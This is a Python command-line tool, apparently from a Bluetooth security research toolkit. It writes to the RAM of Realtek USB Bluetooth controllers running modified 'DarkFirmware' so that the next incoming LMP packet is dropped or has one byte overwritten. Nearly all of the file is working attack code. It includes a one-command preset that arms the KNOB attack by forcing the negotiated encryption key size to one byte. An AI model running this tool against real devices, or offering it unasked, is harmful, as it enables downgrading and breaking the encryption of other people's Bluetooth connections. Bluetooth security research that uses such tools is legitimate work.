#!/usr/bin/env python3
"""In-flight LMP packet modification via DarkFirmware RAM flags.

Controls the firmware's in-flight modification engine:
- Mode 0: passthrough (default)
- Mode 1: modify — overwrite data_buf[offset] with new_value, then forward (one-shot)
- Mode 2: drop — swallow the next incoming LMP packet entirely (one-shot)

Usage:
    sudo python3 lmp_modify.py passthrough     # Set mode 0 (default/disable)
    sudo python3 lmp_modify.py drop             # Drop next incoming LMP packet
    sudo python3 lmp_modify.py modify OFFSET VALUE  # Modify byte at offset
    sudo python3 lmp_modify.py status           # Read current flag/table values
    sudo python3 lmp_modify.py knob             # Pre-set KNOB: modify key_size to 1

Examples:
    sudo python3 lmp_modify.py modify 5 1       # Write 0x01 at data_buf[5]
    sudo python3 lmp_modify.py knob             # Arm KNOB (next KEY_SIZE_REQ → key=1)
    sudo python3 lmp_modify.py drop             # Drop next packet

Addresses:
    mod_flag:  0x80133FF0 (byte 0: mode)
    mod_table: 0x80133FE0 (byte 0: offset, byte 1: value)
"""

import sys
import struct
import argparse

import usbbluetooth
from scapy_usbbluetooth import UsbBluetoothSocket
from scapy.packet import Packet, bind_layers
from scapy.fields import ByteField, XLEIntField, XStrLenField
from scapy.layers.bluetooth import HCI_Hdr, HCI_Command_Hdr, HCI_Event_Command_Complete

MOD_FLAG_ADDR = 0x80133FF0
MOD_TABLE_ADDR = 0x80133FE0

class HCI_Cmd_VSC_Realtek_Read_Mem(Packet):
    name = "Realtek Read Memory"
    fields_desc = [ByteField("size", 0x20), XLEIntField("address", 0x80000000)]
class HCI_Cmd_VSC_Realtek_Write_Mem(Packet):
    name = "Realtek Write Memory"
    fields_desc = [ByteField("size", 0x20), XLEIntField("address", 0x80000000),
                   XLEIntField("data_to_write", 0x33221100)]
class HCI_Cmd_Complete_VSC(Packet):
    name = 'VSC complete'
    fields_desc = [XStrLenField("data", 0, length_from=lambda pkt: pkt.underlayer.underlayer.len)]

bind_layers(HCI_Command_Hdr, HCI_Cmd_VSC_Realtek_Read_Mem, ogf=0x3f, ocf=0x0061)
bind_layers(HCI_Command_Hdr, HCI_Cmd_VSC_Realtek_Write_Mem, ogf=0x3f, ocf=0x0062)
bind_layers(HCI_Event_Command_Complete, HCI_Cmd_Complete_VSC, opcode=0xfc61)
bind_layers(HCI_Event_Command_Complete, HCI_Cmd_Complete_VSC, opcode=0xfc62)


def find_realtek_device():
    controllers = usbbluetooth.list_controllers()
    for c in controllers:
        if ((c.vendor_id == 0x0bda and c.product_id == 0xa728) or
            (c.vendor_id == 0x0bda and c.product_id == 0xa729) or
            (c.vendor_id == 0x2c0a and c.product_id == 0x8761) or
            (c.vendor_id == 0x2550 and c.product_id == 0x8761) or
            (c.vendor_id == 0x2357 and c.product_id == 0x0604)):
            return c
    return None


def read_mem(sock, addr):
    pkt = HCI_Hdr() / HCI_Command_Hdr() / HCI_Cmd_VSC_Realtek_Read_Mem(address=addr)
    resp = sock.sr1(pkt, verbose=0)
    if HCI_Event_Command_Complete in resp and resp[HCI_Event_Command_Complete].status == 0:
        return resp.data
    return None


def write_mem(sock, addr, value):
    pkt = HCI_Hdr() / HCI_Command_Hdr() / HCI_Cmd_VSC_Realtek_Write_Mem(address=addr, data_to_write=value)
    resp = sock.sr1(pkt, verbose=0)
    if HCI_Event_Command_Complete in resp and resp[HCI_Event_Command_Complete].status == 0:
        return True
    return False


def get_status(sock):
    """Read and display current mod_flag and mod_table values."""
    flag_data = read_mem(sock, MOD_FLAG_ADDR)
    table_data = read_mem(sock, MOD_TABLE_ADDR)

    if flag_data is None or table_data is None:
        print("[!] Failed to read memory — DarkFirmware may not be loaded")
        return

    flag_val = flag_data[0] if isinstance(flag_data, (bytes, bytearray)) else int.from_bytes(flag_data, 'little') & 0xFF
    table_val = int.from_bytes(table_data, 'little') if isinstance(table_data, (bytes, bytearray)) else table_data

    byte_offset = table_val & 0xFF
    new_value = (table_val >> 8) & 0xFF

    mode_names = {0: "passthrough", 1: "modify (one-shot)", 2: "drop (one-shot)"}
    mode_name = mode_names.get(flag_val, f"unknown(0x{flag_val:02x})")

    print(f"  mod_flag  @ 0x{MOD_FLAG_ADDR:08X}: mode={flag_val} ({mode_name})")
    print(f"  mod_table @ 0x{MOD_TABLE_ADDR:08X}: byte_offset={byte_offset}, new_value=0x{new_value:02x}")


def set_passthrough(sock):
    """Clear mod_flag to 0 (passthrough mode)."""
    # Read current, preserve upper bytes, clear byte 0
    data = read_mem(sock, MOD_FLAG_ADDR)
    if data is None:
        return False
    val = int.from_bytes(data, 'little') if isinstance(data, (bytes, bytearray)) else data
    new_val = val & 0xFFFFFF00  # Clear byte 0
    return write_mem(sock, MOD_FLAG_ADDR, new_val)


def set_drop(sock):
    """Set mod_flag to 2 (drop mode, one-shot)."""
    data = read_mem(sock, MOD_FLAG_ADDR)
    if data is None:
        return False
    val = int.from_bytes(data, 'little') if isinstance(data, (bytes, bytearray)) else data
    new_val = (val & 0xFFFFFF00) | 0x02
    return write_mem(sock, MOD_FLAG_ADDR, new_val)


def set_modify(sock, byte_offset, new_value):
    """Set mod_table and mod_flag for modify mode."""
    # Write mod_table: [byte_offset:1B, new_value:1B, 0:2B]
    table_val = (new_value << 8) | byte_offset
    if not write_mem(sock, MOD_TABLE_ADDR, table_val):
        return False

    # Set mod_flag to 1 (modify, one-shot)
    data = read_mem(sock, MOD_FLAG_ADDR)
    if data is None:
        return False
    val = int.from_bytes(data, 'little') if isinstance(data, (bytes, bytearray)) else data
    new_flag = (val & 0xFFFFFF00) | 0x01
    return write_mem(sock, MOD_FLAG_ADDR, new_flag)


def main():
    parser = argparse.ArgumentParser(description="DarkFirmware In-Flight LMP Modification")
    parser.add_argument("command", choices=["passthrough", "drop", "modify", "status", "knob"],
                        help="Command to execute")
    parser.add_argument("args", nargs="*", help="For 'modify': OFFSET VALUE (decimal or 0x hex)")
    args = parser.parse_args()

    ctrl = find_realtek_device()
    if ctrl is None:
        print("[!] No Realtek device found")
        sys.exit(1)

    sock = UsbBluetoothSocket(ctrl)

    if args.command == "status":
        print("[*] Current in-flight modification state:")
        get_status(sock)

    elif args.command == "passthrough":
        if set_passthrough(sock):
            print("[+] Mode set to PASSTHROUGH (disabled)")
        else:
            print("[!] Failed to set passthrough")

    elif args.command == "drop":
        if set_drop(sock):
            print("[+] Mode set to DROP (one-shot) — next incoming LMP packet will be swallowed")
        else:
            print("[!] Failed to set drop mode")

    elif args.command == "modify":
        if len(args.args) < 2:
            print("[!] Usage: lmp_modify.py modify OFFSET VALUE")
            sys.exit(1)
        offset = int(args.args[0], 0)
        value = int(args.args[1], 0)
        if offset < 0 or offset > 255 or value < 0 or value > 255:
            print("[!] Offset and value must be 0-255")
            sys.exit(1)
        if set_modify(sock, offset, value):
            print(f"[+] Mode set to MODIFY (one-shot) — data_buf[{offset}] will be set to 0x{value:02x}")
        else:
            print("[!] Failed to set modify mode")

    elif args.command == "knob":
        # KNOB preset: modify the key_size byte in incoming LMP_ENCRYPTION_KEY_SIZE_REQ
        # data_buf layout: [0:4] zeros, [4] opcode<<1|tid, [5] key_size
        # So byte_offset=5, new_value=0x01 (key_size=1)
        if set_modify(sock, 5, 0x01):
            print("[+] KNOB armed — next incoming LMP packet will have data_buf[5]=0x01 (key_size=1)")
            print("    NOTE: This modifies ANY next packet, not just KEY_SIZE_REQ!")
            print("    For targeted KNOB, monitor traffic first to time the arming.")
        else:
            print("[!] Failed to arm KNOB")

    # Always show status after operation
    if args.command != "status":
        print()
        print("[*] Current state:")
        get_status(sock)


if __name__ == "__main__":
    main()
